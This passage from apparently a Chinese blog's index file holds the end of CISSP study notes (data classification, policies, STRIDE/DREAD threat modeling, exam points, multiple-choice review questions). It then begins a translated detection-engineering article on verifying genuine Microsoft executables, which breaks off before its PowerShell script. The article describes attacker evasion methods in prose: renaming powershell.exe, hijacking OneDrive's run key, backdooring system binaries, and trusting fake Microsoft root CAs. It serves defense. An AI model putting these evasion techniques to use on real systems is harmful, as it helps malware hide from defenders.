，CAB)审阅和批准。</li></ul><p>2 . 数据分类<br>　　数据分类方案的主要目的是： 根据重要性和敏感性给数据分配标签，对数据安全保护过程进行规范化和层次化。数据分类用于为数据存储、处理和传输提供安全机制，此外还可以确定如何从系统中删除数据和销毁数据。<br>使用数据分类方案具有下列优点：</p><ul><li>能够证明组织致力于保护宝贵的资源和资产。</li><li>能够有助于确定对组织最关键的或最有价值的资产。</li><li>为安全机制的选择提供安全保证。</li><li>常常是遵守规范或法律约束所必需的。</li><li>帮助定义访问级别、授权使用类型，以及对不再有价值的资源进行解除分类和/或对于销毁操作所需的参数。</li><li>在数据生命周期管理中，对于确定数据的存储(保留)时长、使用和销毁是有帮助的。</li></ul><h4 id="1-2-3-安全角色和责任"><a href="#1-2-3-安全角色和责任" class="headerlink" title="1.2.3 安全角色和责任"></a>1.2.3 安全角色和责任</h4><ul><li>高级管理</li><li>安全专家</li><li>数据所有者</li><li>数据管理员</li><li>用户</li><li>审计人员</li></ul><h4 id="1-2-4-控制架构"><a href="#1-2-4-控制架构" class="headerlink" title="1.2.4 控制架构"></a>1.2.4 控制架构</h4><p>　　安全计划步骤中最重要的一步，也是第一步，就是考虑组织想要的安全解决方案的整体控制框架或结构。</p><h3 id="1-3-开发和文档化安全策略、标准、指导方针和程序"><a href="#1-3-开发和文档化安全策略、标准、指导方针和程序" class="headerlink" title="1.3 开发和文档化安全策略、标准、指导方针和程序"></a>1.3 开发和文档化安全策略、标准、指导方针和程序</h3><h4 id="1-3-1-安全策略"><a href="#1-3-1-安全策略" class="headerlink" title="1.3.1 安全策略"></a>1.3.1 安全策略</h4><p>　　规范化的最高层次被称为安全策略。安全策略是一个文挡，这个文档定义了组织所需的安全范围，并且讨论了需要保护的资产以及安全解决方案为提供必要保护而应当涉及的范围。安全策略概述或归纳了组织的安全需求，定义了主要的安全目标，井且概述了组织的安全架构。安全策略还确定了数据处理的主要功能领域，并且澄清和定义了所有相关的术语。安全策略应当清楚地定义为什么安全性很重要以及哪些资产是有价值的。它是实现安全性的战略计划。安全策略应当广泛地概括出用于保护组织切身利益的安全目标和原则。文档讨论了安全性对于日常营业每个方面的重要性以及高层职员对实现安全措施予以支持的重要性。安全策略被用于分配职责、定义角色、指定审计要求、概述实施过程、指明遵循要求以及定义可接受的风险级别。这个文档通常用于证明高层管理部门为保护不遭受入侵、攻击和灾难予以应有的关注。安全策略是强制性的。<br>　　从安全策略可以引出完整安全解决方案所需的其他很多文档或子元素。策略是广泛的概述，而标准、基准、指导方针和程序包括了更加特定的、详细的与实际安全解决方案有关的信息。标准处于安全策略的下一个层次。</p><h4 id="1-3-2-安全标准、基准及指南"><a href="#1-3-2-安全标准、基准及指南" class="headerlink" title="1.3.2 安全标准、基准及指南"></a>1.3.2 安全标准、基准及指南</h4><ul><li>标准为硬件、软件、技术和安全控制方法的统一使用定义了强制性要求。标准提供了操作过程，在这个过程中，整个组织内部统一实现技术和措施。标准是战术文档，定义了达到安全策略指定的目标和总体方向的步骤或方法。</li><li>基准定义了安全性的最低级别，组织中的所有系统都必须达到基准要求。没有达到基准的所有系统都应该被排除在生产系统之外，直至这些系统被提升达到基准要求为止。基准建立了通用的安全状态基础，所有附加的和更严格的安全措施可以被建立在这个基础之上。基准通常是系统特定的，并且往往指的是行业或政府标准.</li><li>指南是规范化安全策略结构的下一个元素。指南提供了如何实现标准和基准的建议，井且能够作为安全专家和用户的操作指南。指南概述了一套方法(包括行动建议)，但并非强制性的。</li></ul><h4 id="1-3-3-安全程序"><a href="#1-3-3-安全程序" class="headerlink" title="1.3.3 安全程序"></a>1.3.3 安全程序</h4><p>　　程序是规范化安全策略结构的最后一个要素。程序是详细的、按部就班的指导文档，它描述了实现特定安全机制、控制或解决方案所需的确切行动。</p><h3 id="1-4-理解和应用威胁建模"><a href="#1-4-理解和应用威胁建模" class="headerlink" title="1.4 理解和应用威胁建模"></a>1.4 理解和应用威胁建模</h3><p>　　威胁建模是潜在威胁被识别、分类和分析的安全流程。威胁建模的主动式方法发生于系统开发的早期阶段，特别是在初始设计和规范建立阶段。这种类型的威胁建模也被称为防御方式。这种方式基于编码和制作流程中对威胁的预测和特定防御中的设计，而不是依靠部署后的更新和补丁。威胁建模的被动式方法发生在产品被创建和部署之后。此部署可以在测试或实验室环境中，或是指被部署到一般市场上。这种类型的威胁建模也被称为对抗方式。这种威胁建模的技术是道德黑客攻击、渗透测试、代码审查和模糊测试背后的核心概念。</p><h4 id="1-4-1-识别威胁"><a href="#1-4-1-识别威胁" class="headerlink" title="1.4.1 识别威胁"></a>1.4.1 识别威胁</h4><ul><li><strong>关注资产</strong> 这种方法使用资产的估值结果，并试图识别对于宝贵资产的威胁。例如，可以评估一个特定的资产，以确定其是否容易受到攻击。如果资产寄存着数据，则可以评估访问控制来识别能够绕过身份认证或授权机制的威胁。</li><li><strong>关注攻击</strong> 一些组织能够识别潜在的攻击者，并能够基于攻击者的目标识别他们所代表的威胁。例如，政府往往能够识别潜在的攻击者，井识别攻击者想要达到的目标。然后他们可以使用这种知识来识别并保护他们的相关资产。这种方法面临的一个挑战是，可能会出现以往未被视为一种威胁的新攻击者。</li><li><strong>关注软件</strong> 如果一个组织开发了一个软件，则可能会考虑针对软件的潜在威胁。尽管几年前组织一般不自己开发软件，但如今这己非常常见。具体地说，大多数组织都有网络存在，许多都创建了自己的网页。精美的网页带来更多的流量，但他们也需要更复杂的编程，并会受到更多的威胁。</li></ul><p>STRIDE威胁分类方案经常用于对应用程序或操作系统威胁的评估。它包含：</p><ul><li>电子欺骗(Spoofing)</li><li>篡改(Tampering)</li><li>否认(Repudiation)</li><li>信息披露(Information disclosure)</li><li>拒绝服务(DoS)</li><li>权限提升(Elevation of privilege)</li></ul><h4 id="1-4-2-确定和用图表示潜在攻击"><a href="#1-4-2-确定和用图表示潜在攻击" class="headerlink" title="1.4.2 确定和用图表示潜在攻击"></a>1.4.2 确定和用图表示潜在攻击</h4><img src="/notes/cissp学习笔记（1）——通过原则和策略的安全治理/揭示威胁问题的图表实例.png"><h4 id="1-4-3-执行降低分析"><a href="#1-4-3-执行降低分析" class="headerlink" title="1.4.3 执行降低分析"></a>1.4.3 执行降低分析</h4><p>　　执行降低分析是为了分解应用程序、系统或环境。这个任务的目的是更好地理解产品逻辑及其与外部的交互元素。<br>在这个分解流程中，必须了解5个关键概念：</p><ul><li>信任边界信任或安全等级发生改变的位置。</li><li>数据流路径数据在两个位置之间的流动。</li><li>输入点接收外部输入的位置。</li><li>特权操作需要比标准用户账户或流程有更大特权的任何活动，通常需要进行系统修改或改变安全性。</li><li>安全立场和方法细节安全策略、安全基础和安全假设的声明。</li></ul><h4 id="1-4-4-优先级和响应"><a href="#1-4-4-优先级和响应" class="headerlink" title="1.4.4 优先级和响应"></a>1.4.4 优先级和响应</h4><p>　　编制文档后，要对威胁进行排序或定级。可以利用各种技术完成这个过程，如使用概率×潜在<br>损失的排名、高/中/低评级或DREAD系统。<br>设计DREAD 评级系统是为了提供灵活的评级解决方案，其基于对每种威胁的5个主要问题的回答：</p><ul><li>潜在破坏一一如果威胁成真，可能造成的损失有多严重?</li><li>再现性一一攻击者重现这一漏洞有多复杂?</li><li>可利用性一一实施攻击有多难?</li><li>受影响用户一一有多少用户可能受到攻击的影响(按百分比)7</li><li>可发现性攻击者发现弱点会有多难?</li></ul><p>　　通过询问这些以及潜在的额外自定义问题，并对这些回答标注目M几或3/2/1 值，就可以建立一张详细的威胁优先级表。</p><h3 id="1-5-考试要点"><a href="#1-5-考试要点" class="headerlink" title="1.5 考试要点"></a>1.5 考试要点</h3><ul><li><strong>理解CIA三元组的元素：机密性、完整性和可用性</strong> 机密性是客体不能暴露给未授权主体的原则。了解这条原则为什么重要、支持该原则的机制、针对该原则的攻击以及有效的对策。完整性是客体保持自身的正确性以及只能由己授权主体进行有意识修改的原则。了解这条原则为什么重要、支持该原则的机制、针对该原则的攻击以及有效的对策。可用性是经过授权的主体被及时准许和不被打断地访问客体的原则。了解这条原则为什么重要、支持该原则的机制、针对该原则的攻击以及有效的对策。</li><li><strong>能够解释身份标识是如何工作的</strong> 身份标识是一个过程，在这个过程中，主体会表明身份，并且开始提供可问责性。主体必须向系统提供身份，从而启动身份认证、授权和可问责的过程。</li><li>**理解身份认证的过程。认证或测试所声明身份合法性的过程就是身份认证。身份认证要求来自主体的附加信息必须完全对应于被表明的身份。</li><li><strong>了解如何在安全计划中实现授权</strong> 一旦主体通过了身份认证，其访问还必须经过授权。授权的过程确保请求的活动或客体访问，可能获得了为通过身份认证的身份而指派的权利和特权。</li><li><strong>理解安全治理</strong> 安全治理是关于组织支持、定义和指导安全工作的实践集合。</li><li><strong>能够解释审计过程</strong> 审计或监控是程序化方式，通过这种方式，主体在系统中经过身份认证的行为是可问责的。审计也是对系统中未经授权的或异常的活动进行检测的过程。我们需要通过审计来检测主体的恶意行为、入侵企图和系统故障以及重构事件，为起诉提供证据、生成问题报告和分析结果。</li><li><strong>理解可问责性的重要性</strong> 只有在支持可问责性时，组织的安全策略才能够被正确实施。换句话说，只有在主体的活动可问责时，才能够保持安全性。有效的可问责’性依赖于检验主体身份以及跟踪其活动的能力。</li><li><strong>能够解释不可否认性</strong> 不可否认性确保活动或事件的主体无法否认所发生的事件。不可否认性能够防止主体宣称自己没有发送消息、没有执行过某项活动或者不是某个事件的起因。</li><li><strong>理解安全管理计划编制</strong> 安全管理基于三种类型的计划： 战略计划、战术计划和操作计划。战略计划是长期计划，并且是相当稳定的，用于定义组织机构的目的、任务和目标。战术计划是中期计划，用来提供更加详细的实现战略计划所提出目标的计划。操作计划是短期计划，是基于战略和战术计划的非常周详的计划。</li><li><strong>了解规范化安全策略结构的元素</strong> 为了生成全面的安全计划，需要适当地遵守下列要求： 安全策略、标准、基准、指导方针和程序。这些文档清楚地描述了安全需求并反映了责任方的适度关注。</li><li><strong>理解重要的安全角色</strong> 主要的安全角色有高层管理者、组织机构所有者、上层管理者、安全专家、用户、数据所有者、数据管理员以及审计人员。通过构建安全角色的层次，就可以全面限制风险。</li><li><strong>了解如何实现安全意识培训</strong> 在真正的培训开始之前，必须为用户建立树立为公认实体的安全意识。一旦树立了安全意识，培训或教育员工执行工作任务和遵守安全策略就可以开始了。所有的新员工都需要进行培训，这样他们才能够遵守安全策略中规定的所有标准、指导方针和程序。教育是一项更细致的工作，学当三/用户需要学习比他们完成工作任务实际所需知识多得多的知识。教育往往与用户参加认证考试或寻求职务晋升相关联。</li><li><strong>了解分层如何简化安全</strong> 分层是串联使用多个控制层次。使用多层次解决方案，使用许多控制去防范威胁。</li><li><strong>能够解释抽象的概念</strong> 抽象用于将相似的元素放入组、类别或角色(被整体性授予安全控制、限制或权限) 中，抽象提高了实施安全计划的效率。</li><li><strong>理解数据隐藏</strong> 顾名思义，数据隐藏防止主体发现或访问数据。在安全控制和程序设计中，数据隐藏通常是一个关键要素。</li><li><strong>理解对加密的需求</strong> 加密是对计划外的接收者隐藏通信数据的含义或意图的一种艺术和学科。加密可以具有很多形式，并且能够用于所有的电子通信类型，包括文本、音频和视频文件以及应用程序本身。加密技术是安全控制中一个非常重要的元素，尤其系统之间的数据传输更是如此。</li><li><strong>能够解释更改控制和更改管理的概念</strong> 安全环境的改变很可能引入会导致新脆弱性出现的漏洞、重叠、客体丢失和疏漏。面对更改，维持安全性的唯一方法是系统地管理更改。</li><li><strong>了解为什么和如何进行数据分类</strong> 数据分类旨在简化给客体组(而不是单独客体)分配安全控制的过程。两种通用的分类方案是政府/军方分类和商业/私营部门分类。了解政府/军方分类中的5个级别和商业/私营部门分类中的4个级别。</li><li><strong>理解解除分类的重要性</strong> 一旦某个资产不再需要当前分配的分类或敏感性级别保护，就需要解除分类。</li><li><strong>了解COBIT的基础知识</strong> 信息及相关技术控制目标(COBIT)是一种安全概念基础架构，用于组织公司的复杂安全解决方案。</li><li><strong>了解威胁建模的基础知识</strong> 威胁建模是一种安全流程，能识别、分类和分析潜在威胁。威胁建模在设计开发阶段可作为一种提前措施来执行，或在产品被部署后作为一种被动性措施来执行。关键概念包括资产/攻击者/软件、STRIDE、图形表示、约简/分解和DREAD。</li><li><strong>了解安全并购的必要性</strong> 将网络安全风险管理与收购策略和实践进行综合是确保组织的安全策略成功强健的一种手段，而不管组织的规模是什么样的。如果在没有考虑安全性的情况下贸然购买，所购买的这些产品的固有风险将在其整个部署过程中一直存在。</li></ul><h3 id="1-6-复习题"><a href="#1-6-复习题" class="headerlink" title="1.6 复习题"></a>1.6 复习题</h3><ol><li><p>下列哪一项包含安全性的主要目标和目的?<br>A. 网络的外围边界<br>B. CIA 三元组<br>C. 一个独立的系统<br>D. 互联网</p></li><li><p>脆弱性和风险是基于它们对下列哪一项的威胁评估?<br>A 一条或多条CIA 三元组原则<br>B. 数据有效性<br>C. 应尽关注<br>D. 责任范围</p></li><li><p>下列哪一项在CIA 三元组原则中用于说明授权主体被及时授予和不间断地访问对象?<br>A. 识别<br>B. 可用性<br>C. 加密<br>D. 分层</p></li><li><p>下列哪一项不被视为违反保密性?<br>A. 窃取密码<br>B. 窃听<br>C. 硬件破坏<br>D. 杜会工程学</p></li><li><p>下列哪一项是不正确的?<br>A. 保密性的违反包括人为错误。<br>B. 保密性的违反包括管理监督。<br>C. 保密性的违反仅限于直接故意攻击。<br>D. 当传输未正确加密时保密性违反可能发生。</p></li><li><p>STRIDE 通常与用于评估针对应用程序或操作系统的威胁有关。以下哪一项不是STRIDE的元素?<br>A. 欺骗<br>B. 权限提升<br>C. 否认<br>D. 披露</p></li><li><p>如果一个安全机制提供可用性，也就提供了高级别保证，该授权对象可以___数据、对象和资源。<br>A. 控制<br>B. 审计<br>C. 访问<br>D. 否认</p></li><li><p>___指的是保持信息的机密性，防止一旦泄露，个人身份可能造成伤害、尴尬或丢人。<br>A. 隐居<br>B. 隐敲<br>C. 隐私<br>D. 临界</p></li><li><p>对于所有个人的影响，除了下面哪一项以外都需要注意?<br>A. 制约个人电子邮件<br>B. 记录电话交谈<br>C. 收集关于上网习惯的信息<br>D. 用于保留电子邮件的备份机制</p></li><li><p>数据分类管理的什么元素可以覆盖所有其他访问控制的形式?<br>A. 分类<br>B. 物理访问<br>C. 监管者职责<br>D. 取得所有权</p></li><li><p>什么确保了活动或事件的主体不能否认发生过的事件?<br>A. CIA 三元组<br>B. 抽象<br>C. 不可否认性<br>D. 哈希总数</p></li><li><p>以下哪一项相对于分层安全是最重要和独特的概念?<br>A. 多层<br>B. 系列<br>C. 并行<br>D. 过滤</p></li><li><p>下列哪一项不被认为是数据隐藏的例子?<br>A. 防止对象的授权阅读者删除该对象<br>B. 阻止未经授权的访问者访问数据库<br>C. 限制较低级别的主体访问较高级别的数据<br>D. 阻止应用程序直接访问硬件</p></li><li><p>变更管理的主要目标是什么?<br>A. 维护文档<br>B. 保持用户得到变更通知<br>C. 允许失败变更的回滚<br>D. 防止安全危害</p></li><li><p>数据分类方案的主要目标是什么?<br>A. 控制授权主体访问对象<br>B. 为了形式化和根据重要性和敏感性分配标签以分层保护数据的过程<br>C. 为审计可问责性建立交易跟踪<br>D. 为操作访问控制以提供最有效的手段来授予或限制功能</p></li><li><p>在分类数据时，下列哪一项通常是不考虑的特征?<br>A. 价值<br>B. 物体的大小<br>C. 使用寿命<br>D. 国家安全的影响</p></li><li><p>两种常见的数据分类方案是哪些?<br>A. 军事和私营部门<br>B. 个人和政府<br>C. 私营部门和非限制性行业<br>D. 分类和未分类</p></li><li><p>下列哪一项是机密数据的最低军事数据分类?<br>A. 敏感<br>B. 机密<br>C. 专有<br>D. 隐私</p></li><li><p>下列商业/私营部门的哪一个数据分类用来控制组织内的个人信息?<br>A. 机密<br>B. 隐私<br>C. 敏感<br>D. 专有</p></li><li><p>数据分类都用于关注安全控制，除了以下哪一个?<br>A. 存储<br>B. 处理<br>C. 分层<br>D. 转移</p></li></ol>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Microsoft可执行文件是怎么成为Microsoft可执行文件的</title>
      <link href="/Security/Microsoft%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%98%AF%E6%80%8E%E4%B9%88%E6%88%90%E4%B8%BAMicrosoft%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84/"/>
      <url>/Security/Microsoft%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%98%AF%E6%80%8E%E4%B9%88%E6%88%90%E4%B8%BAMicrosoft%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84/</url>
      <content type="html"><![CDATA[<p>　　究竟如何能够区分任意代码与源自Microsoft的代码？我敢打赌，大多数人的反应是：“如果它是由微软签署的，那么它来自微软。“<br>　　我提出这个问题的原因是它的事件量非常大并且无数次被列为威胁评估对象，以至于防御者的优先处理方式是过滤掉已知良好二进制和行为。理论上来说这样做唯一需要考虑的是分类可疑事件（即任何未明确归类为良性的事件）。然而，这个过程必须非常谨慎地制定规则，因为攻击者总是会试用各种方法将恶意行为与良性的二进制和行为融合在一起。<br>　　如何将Microsoft可执行文件归类为良性？为了定义这样一个过程，它有助于理解攻击者如何尝试伪装成Microsoft可执行文件。让我们考虑以下绕过检测的情况：</p><h3 id="1-一个已签名的可被滥用的EXE文件被复制到另一个目录并且重命名为检测良好的文件名后执行以绕过命令行检测"><a href="#1-一个已签名的可被滥用的EXE文件被复制到另一个目录并且重命名为检测良好的文件名后执行以绕过命令行检测" class="headerlink" title="1.一个已签名的可被滥用的EXE文件被复制到另一个目录并且重命名为检测良好的文件名后执行以绕过命令行检测"></a>1.一个已签名的可被滥用的EXE文件被复制到另一个目录并且重命名为检测良好的文件名后执行以绕过命令行检测</h3><p>　　请考虑以下情形：攻击者希望执行恶意PowerShell代码并避免命令行日志记录。他们知道防御者在命令行上可以轻松地检测到“powershell”的“-Command”和“-EncodedCommand”的各种变体。因此，攻击者会将powershell.exe复制到他们能够控制的目录并将其重命名为notepad.exe。熟练的防御者们为了解决这个问题，他们只检测命令行上“-Command”和“-EncodedCommand”的各种变体。对此，经验丰富的攻击者会删除恶意PowerShell的配置文件，目的是从良性的.DAT文件中读取PowerShell代码。这样做可以实现两件事：</p><ol><li>攻击者将其恶意的PowerShell有效负载作为notepad.exe执行，其中没有防御者能够发现的命令行参数。</li><li>与.DAT文件（或任何其他任意文件扩展名）相比，传统的反病毒系统更可能对.PS1文件进行更严格的审查。</li></ol><p>在这种情况下，检测的高级目标如下：</p><blockquote><p>检测已知的，可滥用的，已签名的应用程序的使用，这些应用程序不在其默认的路径和文件名。</p></blockquote><h3 id="2-攻击者试图通过替换良性可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件"><a href="#2-攻击者试图通过替换良性可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件" class="headerlink" title="2.攻击者试图通过替换良性可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件"></a>2.攻击者试图通过替换良性可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件</h3><p>　　请考虑以下情形：您以标准用户身份访问计算机，并希望保留恶意可执行文件。这可能是攻击者可能已完成其作业并将Autoruns用于恶意目的的情况。他们用它来识别隐藏的地方，而不是用它来寻找潜在的威胁。因此，它们会查找所有内置的持久性条目，这些条目指向位于可以控制的目录中的二进制文件。OneDrive是一个很好的候选者，因为它默认保存运行密钥，它位于用户的％APPDATA％目录中。因此，攻击者只需将OneDrive.exe替换为其恶意可执行文件，就可以保持现有的运行密钥不变。</p><img src="/Security/Microsoft可执行文件是怎么成为Microsoft可执行文件的/HKCU为OneDrive运行密钥条目.png" title="[HKCU为OneDrive运行密钥条目，OneDrive位于用户的AppData目录中]"><p>在这种情况下，检测的高级目标如下：</p><blockquote><p>对于公共持久性条目，可执行文件的哪些属性使其正常？如果可以建立“正常”，那么偏离正常应该被认为是可疑的。</p></blockquote><p>让我们提炼出这种场景中攻击者使用的技术：</p><ol><li>预期存在于该目录中的OneDrive可执行文件源自Microsoft。攻击者提供的二进制文件不是来自Microsoft。</li><li>攻击者不是创建新的运行密钥，而是替换现有合法运行密钥指向的二进制文件。</li></ol><h3 id="3-攻击者后门系统可执行文件"><a href="#3-攻击者后门系统可执行文件" class="headerlink" title="3.攻击者后门系统可执行文件"></a>3.攻击者后门系统可执行文件</h3><p>　　在这种情况下，攻击者使用像Backdoor Factory这样的工具来回溯系统可执行文件。<br>从检测角度考虑以下目标：</p><blockquote><p>系统可执行文件应驻留在特定目录中，并且应具有有效的Microsoft签名。任何改变都应被视为可疑。</p></blockquote><h3 id="4-攻击者伪装Microsoft数字签名并使用“Microsoft”证书签署其恶意代码"><a href="#4-攻击者伪装Microsoft数字签名并使用“Microsoft”证书签署其恶意代码" class="headerlink" title="4.攻击者伪装Microsoft数字签名并使用“Microsoft”证书签署其恶意代码"></a>4.攻击者伪装Microsoft数字签名并使用“Microsoft”证书签署其恶意代码</h3><p>　　攻击者可以将合法的Microsoft数字签名应用于其恶意代码，并通过执行SIP/信任提供程序劫持攻击（需要提升权限）强制其生效。他们还可以制作一个具有Microsoft证书链外观的证书链，并在受害者系统上明确信任他们虚假的“Microsoft”根CA.</p><p>在这种情况下，检测的高级目标如下：</p><blockquote><p>检测对负责代码签名验证的注册表值的更改，确定值得信任的根CA，并针对给定二进制文件与预期根CA的改变发出警报。</p></blockquote><h2 id="共同防护假设"><a href="#共同防护假设" class="headerlink" title="共同防护假设"></a>共同防护假设</h2><p>　　鉴于这些特别绕过的攻击情景，重要的是对自己诚实并承认一些共同的维护者假设，否则，在成熟的攻击者面前不会有持续改进的希望。此外，正如Dane Stuckey雄辩地说的那样：“检测工程是一个永无止境的旅程。如果你认为自己到达目的地，那你就已经失败了。“</p><ul><li>防御者可能不会认为攻击者可能会重命名可执行文件或考虑这样做的理由。</li><li>防御者可能不会考虑攻击者将可执行文件复制到另一个目录的理由。</li><li>一种假设可能是攻击者更有可能建立一种新的持久性技术而不是劫持现有的合法技术。</li><li>防御者可能不会考虑或使用光学器件来检测未签名的系统可执行文件（或具有无效签名的可执行文件）的加载，否则该文件应具有经过验证的签名。</li><li>防御者可能隐含地信任签名验证实用程序的输出，而不考虑根CA信任的含义/含义。<br>　　现在，如果没有提出的解决方案，确定问题并不是很有用。以下将讨论可执行文件的属性，在处理和克服这些突出显示的假设时应考虑这些属性。</li></ul><h3 id="定义良性Microsoft可执行文件的功能"><a href="#定义良性Microsoft可执行文件的功能" class="headerlink" title="定义良性Microsoft可执行文件的功能"></a>定义良性Microsoft可执行文件的功能</h3><p>　　因此，从防御者的角度来看，我们可以使用哪些可执行文件属性将给定的Microsoft可执行文件分类为正确的Microsoft可执行文件？我建议如下：</p><h4 id="1-可执行文件的原始路径。"><a href="#1-可执行文件的原始路径。" class="headerlink" title="1.可执行文件的原始路径。"></a>1.可执行文件的原始路径。</h4><p>　　例如，应该注意notepad.exe应该驻留在％windir％，％windir％\ System32和％windir％\ SysWOW64中。任何偏离这些路径的行为都应被视为可疑。另请注意，我通过其环境变量引用Windows目录。永远不要认为启动分区是“C”。</p><h4 id="2-可执行文件的预期文件名。"><a href="#2-可执行文件的预期文件名。" class="headerlink" title="2.可执行文件的预期文件名。"></a>2.可执行文件的预期文件名。</h4><p>　　任何与预期文件名的偏差都应被视为可疑。</p><h4 id="3-可执行文件的原始文件名。"><a href="#3-可执行文件的原始文件名。" class="headerlink" title="3.可执行文件的原始文件名。"></a>3.可执行文件的原始文件名。</h4><p>　　原始文件名出现在几乎所有已签名的PE文件的“版本信息”资源中。这是您在查看PE文件属性的“详细信息”选项卡时看到的内容。</p><img src="/Security/Microsoft可执行文件是怎么成为Microsoft可执行文件的/文件属性.png"><p>请注意，原始文件名并不总是与磁盘上的预期文件名相同。原始文件名的好处是，任何修改它的尝试都将使二进制文件的签名无效。这就是Windows Defender应用程序控制（WDAC）阻止单个文件的方式。</p><h4 id="4-可执行文件的文件描述。"><a href="#4-可执行文件的文件描述。" class="headerlink" title="4.可执行文件的文件描述。"></a>4.可执行文件的文件描述。</h4><p>　　这是“版本信息”资源中存在的另一个字段，可以考虑添加或替代原始文件名。在某些情况下，可能不存在原始文件名，因此应在其位置考虑文件描述。这就是fsi.exe的情况 - 由Matt Nelson发现的一个可滥用的二进制文件，在微软添加了阻止其他“版本信息”属性的能力之前，最初无法被WDAC有效阻止。</p><h4 id="5-可执行文件的签名状态。"><a href="#5-可执行文件的签名状态。" class="headerlink" title="5.可执行文件的签名状态。"></a>5.可执行文件的签名状态。</h4><p>　　对于预期要签名的二进制文件，除“有效”之外的任何签名验证状态都应被视为可疑。Get-AuthenticodeSignature cmdlet支持以下值以供参考：</p><ul><li>HashMismatch - 表示可执行文件的完整性受到损害</li><li>不相容</li><li>未签名</li><li>NotSupportedFileFormat</li><li>不可信 - 表示签名者的证书已被撤销或明确标记为不允许。</li><li>有效 - 表示已验证可执行文件的完整性，并且证书链正确链接到受信任的根CA.<br>　　应该注意的是，如果PE文件没有“数字签名”选项卡而没有签名，那么这是一种常见的误解。几乎所有内置于Windows的代码都已签名，其中大部分都是目录签名的。如果在目标系统之外的某处执行签名验证，这肯定会有问题，这是VirusTotal所阐述的挑战。</li></ul><h4 id="6-文件是否为内置Windows二进制文件？"><a href="#6-文件是否为内置Windows二进制文件？" class="headerlink" title="6.文件是否为内置Windows二进制文件？"></a>6.文件是否为内置Windows二进制文件？</h4><p>　　随操作系统提供的任何代码都将进行Windows签名，由包含“Windows系统组件验证”EKU属性（OID - 1.3.6.1.4.1.311.10.3.6）的Microsoft数字签名表示。如果签名有效，则Get-AuthenticodeSignature的“IsOSBinary”属性将返回true，是Windows签名的，并且根植于一小组受信任的Microsoft根CA.</p><h4 id="7-签名者主题和指纹"><a href="#7-签名者主题和指纹" class="headerlink" title="7.签名者主题和指纹"></a>7.签名者主题和指纹</h4><p>　　证书的主题字段用于标识颁发证书的组织。指纹（即证书的SHA1哈希）用于断言证书的完整性。有一大堆Microsoft签名证书。从检测角度来看，该字段仅用于提供信息。最准确地说，由Microsoft签名的代码由一小组根CA证书之一颁发的任何证书签名。</p><h4 id="8-根发行者主题和指纹"><a href="#8-根发行者主题和指纹" class="headerlink" title="8.根发行者主题和指纹"></a>8.根发行者主题和指纹</h4><p>　　签名仅与发布它的根CA一样可信。攻击者可以轻松地信任受害者系统上的恶意根CA证书，这就是为什么在执行签名验证时识别一小组Microsoft根CA很重要的原因。它们由以下指纹/主题值组成：</p><ul><li>CDD4EEAE6000AC7F40C3802C171E30148030C072 - CN = Microsoft根证书颁发机构，DC = microsoft，DC = com</li><li>A43489159A520F0D93D032CCAF37E7FE20A8B419 - CN = Microsoft Root Authority，OU = Microsoft Corporation，OU =版权所有©1997 Microsoft Corp.</li><li>3B1EFD3A66EA28B16697394703A72CA340A05BD5 - CN = Microsoft根证书颁发机构2010，O = Microsoft Corporation，L = Redmond，S = Washington，C = US</li><li>8F43288AD272F3103B6FB1428485EA3014C0BCFE - CN = Microsoft根证书颁发机构2011，O = Microsoft Corporation，L = Redmond，S = Washington，C = US</li><li>（可选，如果您想信任Windows Insider预览代码）F8DB7E1C16F1FFD4AAAD4AAD8DFF0F2445184AEB - CN = Microsoft Development Root Certificate Authority 2014，O = Microsoft Corporation，L = Redmond，S = Washington，C = US<br>　　不要相信我！通过与authroot.stl或使用sigcheck -tv和比较来验证自己sigcheck -tuv。<h3 id="建立基线程序"><a href="#建立基线程序" class="headerlink" title="建立基线程序"></a>建立基线程序</h3>上面强调的所有相关属性都需要首先在一组清洁系统上进行基线化 - 标准的企业黄金映像将是理想的。您如何决定捕获这些属性取决于您。我编写了这个PowerShell脚本来获取黄金映像中的所有相关信息：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td 